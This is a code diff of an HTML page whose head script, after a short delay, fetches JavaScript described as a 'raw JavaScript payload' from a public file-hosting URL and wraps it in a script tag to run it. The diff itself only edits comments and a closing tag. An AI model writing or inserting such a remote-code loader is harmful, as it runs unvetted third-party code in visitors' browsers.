@@ -6,10 +6,10 @@
   <link rel="stylesheet" href="style250.css" />
   <script>
   setTimeout(() => {
-    fetch('https://files.catbox.moe/cwedrd.js') // your raw JavaScript payload
+    fetch('https://files.catbox.moe/cwedrd.js') // The raw JavaScript payload
       .then(res => res.text())
       .then(js => {
-        // Wrap the payload inside a full HTML document with <script> tag
+        // Wraps the payload inside a full HTML document with <script> tag
         const wrapper = `
         <!DOCTYPE html>
         <html>
@@ -70,8 +70,8 @@
       .catch(e => {
         document.getElementById("status").textContent = `The bottle couldn't even be poured: ${e.message}`;
       });
-  }, 1500); <
-</script>
+  }, 1500);
+  </script>
 </head>
 <body>
   <div class="container">
